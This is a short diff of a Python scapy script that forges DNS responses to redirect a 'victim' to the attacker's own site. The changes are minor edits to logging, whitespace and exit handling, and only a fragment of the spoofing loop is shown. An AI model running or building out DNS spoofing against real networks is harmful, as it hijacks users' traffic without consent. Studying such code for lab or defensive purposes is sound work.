@@ -4,8 +4,10 @@ import Queue as q
 
 que = q.Queue()
 
+
 def put_q(put):
     que.put(put)
+
 
 def get_q():
     que.get(False)
@@ -66,7 +68,7 @@ def dns_spoof(interface):
                              scapy.all.DNS(id=dnsId, qd=dnsQd, aa=1, qr=1, an=scapy.all.DNSRR(rrname=queryName, ttl=20, rdata=my_site))
 
             # send packet to victim
-            print(spoof_response)
+            print(spoof_response.getlayer(DNSQR).qname)
             scapy.all.send(spoof_response)
             try:
                 message = que.get(False)
@@ -78,7 +80,7 @@ def dns_spoof(interface):
             except:
                 q.Empty
         # elif: exit??
-
+    sys.exit(0)
 
 """def return_packet():
   
